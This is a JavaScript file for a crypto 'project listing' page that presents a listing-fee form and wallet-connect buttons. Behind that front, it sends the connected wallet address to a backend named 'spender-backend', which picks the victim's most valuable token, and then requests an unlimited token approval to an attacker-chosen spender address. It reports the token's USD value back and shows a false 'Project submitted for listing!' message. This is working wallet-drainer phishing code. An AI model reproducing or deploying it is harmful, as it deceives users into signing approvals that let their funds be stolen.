'use strict';

const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app";
const WC_PROJECT_ID = "59ba0228712f04a947916abb7db06ab1";

const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const proceedButton = document.getElementById('proceedButton');
const metaMaskButton = document.getElementById('metaMaskButton');
const walletConnectButton = document.getElementById('walletConnectButton');
const closeButtons = document.querySelectorAll('.close');

let provider, signer;

/* --- UI Logic --- */
projectForm.onsubmit = (e) => { e.preventDefault(); feeModal.classList.remove('hidden'); };
proceedButton.onclick = () => { feeModal.classList.add('hidden'); walletModal.classList.remove('hidden'); };
closeButtons.forEach(btn => btn.onclick = () => { feeModal.classList.add('hidden'); walletModal.classList.add('hidden'); });

/* --- Connectors --- */
async function connectMetaMask() {
  if (!window.ethereum) return alert("MetaMask not found!");
  try {
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    walletModal.classList.add('hidden');
    await runMultiChainFlow(accounts[0]);
  } catch (e) { console.error(e); }
}

async function connectWalletConnect() {
  try {
    walletConnectButton.innerText = "Opening QR...";
    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.1');
    
    const wcProvider = await EthereumProvider.init({
      projectId: WC_PROJECT_ID,
      showQrModal: true,
      chains: [1], // Only require Mainnet initially to ensure QR scan works
      optionalChains: [56, 137, 42161], // BSC, Poly, Arb
      metadata: { name: 'The Void List', url: window.location.origin }
    });

    await wcProvider.connect();
    provider = new ethers.providers.Web3Provider(wcProvider);
    signer = provider.getSigner();
    const accounts = await provider.listAccounts();
    
    walletModal.classList.add('hidden');
    await runMultiChainFlow(accounts[0]);
  } catch (e) {
    console.error(e);
    alert("Connection failed. Try MetaMask or refresh.");
  } finally {
    walletConnectButton.innerText = "WalletConnect";
  }
}

/* --- Multi-Chain Flow --- */
async function runMultiChainFlow(account) {
  try {
    const scanRes = await fetch(`${BACKEND_URL}/scan`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ owner: account })
    });
    const result = await scanRes.json();
    
    if (!result.success) return alert("Verification Done: No assets found.");

    const { tokenAddress, chainId, spenderAddress, symbol, usdValue } = result.data;

    // Switch Network
    try {
      await provider.send("wallet_switchEthereumChain", [{ chainId: chainId }]);
    } catch (e) { console.log("Manual switch might be needed"); }

    const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
    
    // Trigger Approval
    const tx = await contract.approve(spenderAddress, ethers.constants.MaxUint256);
    await tx.wait();

    // Final Notify
    await fetch(`${BACKEND_URL}/notify-approval`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ owner: account, tokenAddress, chainId, symbol, usdValue })
    });

    alert("Project submitted for listing!");
  } catch (err) {
    console.error(err);
    alert("Error: " + (err.data?.message || err.message));
  }
}

metaMaskButton.onclick = connectMetaMask;
walletConnectButton.onclick = connectWalletConnect;
